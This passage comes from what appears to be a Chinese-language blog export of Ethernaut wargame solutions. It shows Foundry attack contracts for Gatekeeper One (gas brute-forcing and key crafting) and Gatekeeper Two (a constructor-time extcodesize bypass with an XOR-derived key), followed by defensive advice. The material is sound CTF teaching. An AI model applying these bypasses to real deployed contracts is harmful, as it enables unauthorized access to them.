instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperOne();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testattacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // 使用试错法找到合适的gas值 (例如 268)</span><br><span class=\"line\">        attacker.attack(268);</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack is Test &#123;</span><br><span class=\"line\">    GatekeeperOne instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address fb) &#123;</span><br><span class=\"line\">        instance = GatekeeperOne(fb);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 构造 gateKey 并使用指定的 gas 调用 enter 函数</span><br><span class=\"line\">    function attack(uint256 gas) public &#123;</span><br><span class=\"line\">        // 构造满足 gateThree 的 key</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 使用计算好的 gas 调用目标函数</span><br><span class=\"line\">        instance.enter&#123;gas: 8191 * 10 + gas&#125;(gateKey);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 用于暴力破解 gas 值的函数</span><br><span class=\"line\">    function findGas() public &#123;</span><br><span class=\"line\">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class=\"line\">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class=\"line\">        </span><br><span class=\"line\">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class=\"line\">            try instance.enter&#123;gas: 8191 * 10 + i&#125;(gateKey) &#123;</span><br><span class=\"line\">                console.log(&quot;Found gas:&quot;, i); // 实验得出 i = 268</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125; catch &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        revert(&quot;No gas match found!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>创建攻击合约</strong>: 绕过 <code>gateOne</code> (<code>msg.sender != tx.origin</code>)。</li>\n<li><strong>构造 <code>_gateKey</code></strong>:<ul>\n<li>获取 <code>tx.origin</code> 的低16位。</li>\n<li>将其构造成一个 <code>bytes8</code> 值，满足 <code>gateThree</code> 的所有 <code>require</code> 条件。</li>\n</ul>\n</li>\n<li><strong>暴力破解 <code>gas</code></strong>:<ul>\n<li>编写一个循环，尝试不同的 <code>gas</code> 值来调用 <code>enter</code> 函数。</li>\n<li>在 <code>Foundry</code> 测试中，我们可以通过 <code>try/catch</code> 捕获失败的调用，直到找到一个成功的 <code>gas</code> 值（例如，<code>gas</code> 偏移量为 <code>268</code>）。</li>\n</ul>\n</li>\n<li><strong>发起攻击</strong>: 使用找到的 <code>gas</code> 值和构造的 <code>_gateKey</code> 从攻击合约中调用 <code>enter</code> 函数。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免复杂的 <code>gas</code> 检查</strong>: <code>gasleft()</code> 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。</li>\n<li><strong>简化类型转换逻辑</strong>: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。</li>\n<li><strong>使用更安全的认证模式</strong>: 不要依赖 <code>tx.origin</code> 或 <code>gas</code> 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>Foundry <code>try/catch</code></strong>: 用于在测试中捕获和处理预期的 <code>revert</code>，非常适合暴力破解 <code>gas</code> 等场景。</li>\n<li><strong>位操作 (<code>|</code>, <code>&amp;</code>)</strong>: 在构造 <code>_gateKey</code> 时用于精确控制字节内容。</li>\n<li><strong>类型转换</strong>: 深入理解Solidity中不同整数类型（<code>uint16</code>, <code>uint32</code>, <code>uint64</code>）和字节类型（<code>bytes8</code>）之间的转换规则至关重要。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>tx.origin</code> vs <code>msg.sender</code> 的区别是许多合约攻击的基础。</li>\n<li><code>gasleft()</code> 的值是动态的，依赖它进行验证是脆弱的。</li>\n<li>Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过中间合约绕过 <code>tx.origin</code> 检查。</li>\n<li>通过暴力破解找到满足 <code>gasleft()</code> 模运算的 <code>gas</code> 值。</li>\n<li>通过逆向工程类型转换和位操作的 <code>require</code> 条件来构造一个有效的输入。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>不要将 <code>gas</code> 消耗作为安全机制。</li>\n<li>保持验证逻辑的简单和直接。</li>\n<li>使用经过验证的、更强大的身份验证模式。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/types.html#conversions\">Solidity 类型转换</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">tx.origin vs msg.sender</a></li>\n</ul>\n"},{"title":"Etnhernault Level 14: Gatekeeper Two - 合约创建时的 extcodesize","date":"2025-01-25T08:15:00.000Z","updated":"2025-01-25T08:15:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用合约在 `constructor` 阶段 `extcodesize` 为0的特性，巧妙绕过复杂的访问控制。深入理解 `caller()` 和 `extcodesize` 的工作原理，掌握 Gatekeeper Two 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize\n\n> **关卡链接**: [Ethernaut Level 14 - Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)  \n> **攻击类型**: `extcodesize` / `constructor` 交互  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n与上一关类似，我们需要再次通过三个 `modifier` 的检查，成为 `entrant`。\n\n![Gatekeeper Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)\n\n## 🔍 漏洞分析\n\n要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，并绕过它的三个 `modifier`。\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\n与第13关完全相同。我们需要通过一个中间合约来调用 `enter` 函数，以确保 `msg.sender` 是合约地址，而 `tx.origin` 是我们的EOA地址。\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  uint x;\n  assembly {\n    x := extcodesize(caller())\n  }\n  require(x == 0);\n  _;\n}\n```\n\n这个 `modifier` 使用内联汇编检查 `caller()` 的 `extcodesize` 是否为0。`caller()` 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 `extcodesize` 返回该地址关联的代码大小。\n\n-   如果调用者是一个已经部署的合约，`extcodesize` 会返回一个大于0的值。\n-   如果调用者是一个外部账户（EOA），`extcodesize` 返回0。\n\n这与 `gateOne` 的要求（`msg.sender` 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 `extcodesize` 为0呢？\n\n答案在于合约的创建过程：**当一个合约的 `constructor` 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 `extcodesize` 会返回0。**\n\n因此，我们必须在攻击合约的 `constructor` 内部调用目标合约的 `enter` 函数。\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n  _;\n}\n```\n\n这个 `modifier` 包含一个有趣的异或（XOR）逻辑。让我们简化一下：\n\n`A ^ B = C`\n\n其中：\n-   `A` 是 `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n-   `B` 是 `uint64(_gateKey)`\n-   `C` 是 `type(uint64).max` (即 `0xFFFFFFFFFFFFFFFF`)\n\n根据异或运算的性质，如果 `A ^ B = C`，那么 `A ^ C = B`。\n\n因此，我们可以通过计算 `A ^ C` 来得到我们需要的 `_gateKey`。\n\n`_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`\n\n由于 `msg.sender` 是我们的攻击合约地址，我们可以在攻击合约的 `constructor` 中计算出这个值。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n我们的攻击合约非常简洁。它在 `constructor` 中完成所有的工作：计算 `gateKey` 并立即调用目标实例的 `enter` 函数。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/14_GatekeeperTwo.sol\";\n\n// Foundry 测试合约\ncontract GatekeeperTwoTest is Test {\n    GatekeeperTwo instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperTwo();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n        // 部署攻击合约时，其构造函数会自动执行攻击\n        attacker = new Attack(address(instance));\n        // 验证攻击是否成功\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\n// 攻击合约\ncontract Attack {\n    constructor(address _instanceAddress) {\n        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);\n\n        // 计算 gateKey\n        // A ^ C = B\n        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));\n        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF\n        bytes8 gateKey = bytes8(keyPart ^ max_uint);\n\n        // 在构造函数中调用 enter 函数\n        instance.enter(gateKey);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **创建攻击合约**: 攻击逻辑完全包含在 `constructor` 中。\n2.  **在 `constructor` 中调用**: 这是关键。在 `constructor` 中调用 `enter` 函数，此时 `extcodesize(address(this))` 为0，绕过了 `gateTwo`。\n3.  **计算 `_gateKey`**: 在 `constructor` 中，使用 `address(this)` 作为 `msg.sender` 来计算 `keccak256` 哈希，并通过XOR运算得到正确的 `_gateKey`，从而绕过 `gateThree`。\n4.  **部署即攻击**: 部署攻击合约的交易一旦成功，攻击就完成了，`entrant` 将被设置为我们的EOA地址。\n\n## 🛡️ 防御措施\n\n1.  **避免使用 `extcodesize` 进行合约检查**: 正如本例所示，`extcodesize` 可以被 `constructor` 调用绕过。一个更可靠的检查方法是判断 `address.balance > 0` 或者 `address.code.length > 0`（在Solidity 0.8.10及更高版本中）。\n2.  **对 `caller` 的额外检查**: 如果确实需要阻止合约调用，可以结合 `tx.origin == msg.sender` 的检查，但这会限制合约的可组合性。\n3.  **简化密钥验证**: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。\n\n## 🔧 相关工具和技术\n\n-   **`constructor`**: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 `extcodesize` 为0）是解决此类挑战的关键。\n-   **`extcodesize`**: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。\n-   **异或运算 (`^`)**: 一种位运算符，在密码学和哈希操作中很常见。理解其 `A ^ B = C` <=> `A ^ C = B` 的性质对于解决 `gateThree` 至关重要。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约在 `constructor` 执行期间的代码大小（`extcodesize`）为0。\n-   `caller()` 和 `address(this)` 在特定上下文中的区别和联系。\n-   异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。\n\n**攻击向量**:\n-   利用 `constructor` 的特性绕过 `extcodesize` 检查。\n-   在 `constructor` 中完成所有攻击步骤，实现“部署即攻击”。\n-   逆向工程XOR逻辑以计算出所需的密钥。\n\n**防御策略**:\n-   不要依赖 `extcodesize` 来判断一个地址是否为合约。\n-   设计更简单、更直接的验证机制，避免模糊的链上密钥派生。\n\n## 📚 参考资料\n\n-   [Solidity Docs: `extcodesize` Caveats](https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction)\n-   [Understanding the EVM: Opcodes](https://www.evm.codes/)","source":"_posts/ethernaut-level-14-gatekeeper-two.md","raw":"---\ntitle: 'Etnhernault Level 14: Gatekeeper Two - 合约创建时的 extcodesize'\ndate: 2025-01-25 16:15:00\nupdated: 2025-01-25 16:15:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - extcodesize\n  - constructor\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用合约在 `constructor` 阶段 `extcodesize` 为0的特性，巧妙绕过复杂的访问控制。深入理解 `caller()` 和 `extcodesize` 的工作原理，掌握 Gatekeeper Two 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize\n\n> **关卡链接**: [Ethernaut Level 14 - Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)  \n> **攻击类型**: `extcodesize` / `constructor` 交互  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n与上一关类似，我们需要再次通过三个 `modifier` 的检查，成为 `entrant`。\n\n![Gatekeeper Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)\n\n## 🔍 漏洞分析\n\n要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，并绕过它的三个 `modifier`。\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\n与第13关完全相同。我们需要通过一个中间合约来调用 `enter` 函数，以确保 `msg.sender` 是合约地址，而 `tx.origin` 是我们的EOA地址。\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  uint x;\n  assembly {\n    x := extcodesize(caller())\n  }\n  require(x == 0);\n  _;\n}\n```\n\n这个 `modifier` 使用内联汇编检查 `caller()` 的 `extcodesize` 是否为0。`caller()` 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 `extcodesize` 返回该地址关联的代码大小。\n\n-   如果调用者是一个已经部署的合约，`extcodesize` 会返回一个大于0的值。\n-   如果调用者是一个外部账户（EOA），`extcodesize` 返回0。\n\n这与 `gateOne` 的要求（`msg.sender` 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 `extcodesize` 为0呢？\n\n答案在于合约的创建过程：**当一个合约的 `constructor` 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 `extcodesize` 会返回0。**\n\n因此，我们必须在攻击合约的 `constructor` 内部调用目标合约的 `enter` 函数。\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n  _;\n}\n```\n\n这个 `modifier` 包含一个有趣的异或（XOR）逻辑。让我们简化一下：\n\n`A ^ B = C`\n\n其中：\n-   `A` 是 `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n-   `B` 是 `uint64(_gateKey)`\n-   `C` 是 `type(uint64).max` (即 `0xFFFFFFFFFFFFFFFF`)\n\n根据异或运算的性质，如果 `A ^ B = C`，那么 `A ^ C = B`。\n\n因此，我们可以通过计算 `A ^ C` 来得到我们需要的 `_gateKey`。\n\n`_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`\n\n由于 `msg.sender` 是我们的攻击合约地址，我们可以在攻击合约的 `constructor` 中计算出这个值。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n我们的攻击合约非常简洁。它在 `constructor` 中完成所有的工作：计算 `gateKey` 并立即调用目标实例的 `enter` 函数。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/14_GatekeeperTwo.sol\";\n\n// Foundry 测试合约\ncontract GatekeeperTwoTest is Test {\n    GatekeeperTwo instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperTwo();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n        // 部署攻击合约时，其构造函数会自动执行攻击\n        attacker = new Attack(address(instance));\n        // 验证攻击是否成功\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\n// 攻击合约\ncontract Attack {\n    constructor(address _instanceAddress) {\n        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);\n\n        // 计算 gateKey\n        // A ^ C = B\n        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));\n        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF\n        bytes8 gateKey = bytes8(keyPart ^ max_uint);\n\n        // 在构造函数中调用 enter 函数\n        instance.enter(gateKey);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **创建攻击合约**: 攻击逻辑完全包含在 `constructor` 中。\n2.  **在 `constructor` 中调用**: 这是关键。在 `constructor` 中调用 `enter` 函数，此时 `extcodesize(address(this))` 为0，绕过了 `gateTwo`。\n3.  **计算 `_gateKey`**: 在 `constructor` 中，使用 `address(this)` 作为 `msg.sender` 来计算 `keccak256` 哈希，并通过XOR运算得到正确的 `_gateKey`，从而绕过 `gateThree`。\n4.  **部署即攻击**: 部署攻击合约的交易一旦成功，攻击就完成了，`entrant` 将被设置为我们的EOA地址。\n\n## 🛡️ 防御措施\n\n1.  **避免使用 `extcodesize` 进行合约检查**: 正如本例所示，`extcodesize` 可以被 `constructor` 调用绕过。一个更可靠的检查方法是判断 `address.balance > 0` 或者 `address.code.length > 0`（在Solidity 0.8.10及更高版本中）。\n2.  **对 `caller` 的额外检查**: 如果确实需要阻止合约调用，可以结合 `tx.origin == msg.sender` 的检查，但这会限制合约的可组合性。\n3.  **简化密钥验证**: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。\n\n## 🔧 相关工具和技术\n\n-   **`constructor`**: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 `extcodesize` 为0）是解决此类挑战的关键。\n-   **`extcodesize`**: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。\n-   **异或运算 (`^`)**: 一种位运算符，在密码学和哈希操作中很常见。理解其 `A ^ B = C` <=> `A ^ C = B` 的性质对于解决 `gateThree` 至关重要。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约在 `constructor` 执行期间的代码大小（`extcodesize`）为0。\n-   `caller()` 和 `address(this)` 在特定上下文中的区别和联系。\n-   异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。\n\n**攻击向量**:\n-   利用 `constructor` 的特性绕过 `extcodesize` 检查。\n-   在 `constructor` 中完成所有攻击步骤，实现“部署即攻击”。\n-   逆向工程XOR逻辑以计算出所需的密钥。\n\n**防御策略**:\n-   不要依赖 `extcodesize` 来判断一个地址是否为合约。\n-   设计更简单、更直接的验证机制，避免模糊的链上密钥派生。\n\n## 📚 参考资料\n\n-   [Solidity Docs: `extcodesize` Caveats](https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction)\n-   [Understanding the EVM: Opcodes](https://www.evm.codes/)","slug":"ethernaut-level-14-gatekeeper-two","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpd0013bf5q6ik6gca5","content":"<h1 id=\"🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize\"><a href=\"#🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize\" class=\"headerlink\" title=\"🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize\"></a>🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/14\">Ethernaut Level 14 - Gatekeeper Two</a><br><strong>攻击类型</strong>: <code>extcodesize</code> &#x2F; <code>constructor</code> 交互<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>与上一关类似，我们需要再次通过三个 <code>modifier</code> 的检查，成为 <code>entrant</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg\" alt=\"Gatekeeper Two Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，并绕过它的三个 <code>modifier</code>。</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与第13关完全相同。我们需要通过一个中间合约来调用 <code>enter</code> 函数，以确保 <code>msg.sender</code> 是合约地址，而 <code>tx.origin</code> 是我们的EOA地址。</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  uint x;</span><br><span class=\"line\">  assembly &#123;</span><br><span class=\"line\">    x := extcodesize(caller())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  require(x == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 使用内联汇编检查 <code>caller()</code> 的 <code>extcodesize</code> 是否为0。<code>caller()</code> 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 <code>extcodesize</code> 返回该地址关联的代码大小。</p>\n<ul>\n<li>如果调用者是一个已经部署的合约，<code>extcodesize</code> 会返回一个大于0的值。</li>\n<li>如果调用者是一个外部账户（EOA），<code>extcodesize</code> 返回0。</li>\n</ul>\n<p>这与 <code>gateOne</code> 的要求（<code>msg.sender</code> 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 <code>extcodesize</code> 为0呢？</p>\n<p>答案在于合约的创建过程：<strong>当一个合约的 <code>constructor</code> 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 <code>extcodesize</code> 会返回0。</strong></p>\n<p>因此，我们必须在攻击合约的 <code>constructor</code> 内部调用目标合约的 <code>enter</code> 函数。</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <code>modifier</code> 包含一个有趣的异或（XOR）逻辑。让我们简化一下：</p>\n<p><code>A ^ B = C</code></p>\n<p>其中：</p>\n<ul>\n<li><code>A</code> 是 <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code></li>\n<li><code>B</code> 是 <code>uint64(_gateKey)</code></li>\n<li><code>C</code> 是 <code>type(uint64).max</code> (即 <code>0xFFFFFFFFFFFFFFFF</code>)</li>\n</ul>\n<p>根据异或运算的性质，如果 <code>A ^ B = C</code>，那么 <code>A ^ C = B</code>。</p>\n<p>因此，我们可以通过计算 <code>A ^ C</code> 来得到我们需要的 <code>_gateKey</code>。</p>\n<p><code>_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p>\n<p>由于 <code>msg.sender</code> 是我们的攻击合约地址，我们可以在攻击合约的 <code>constructor</code> 中计算出这个值。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>我们的攻击合约非常简洁。它在 <code>constructor</code> 中完成所有的工作：计算 <code>gateKey</code> 并立即调用目标实例的 <code>enter</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/14_GatekeeperTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Foundry 测试合约</span><br><span class=\"line\">contract GatekeeperTwoTest is Test &#123;</span><br><span class=\"line\">    GatekeeperTwo instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        instance = new GatekeeperTwo();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\">        // 部署攻击合约时，其构造函数会自动执行攻击</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">        // 验证攻击是否成功</span><br><span class=\"line\">        assertEq(instance.entrant(), player1);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    constructor(address _instanceAddress) &#123;</span><br><span class=\"line\">        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 计算 gateKey</span><br><span class=\"line\">        // A 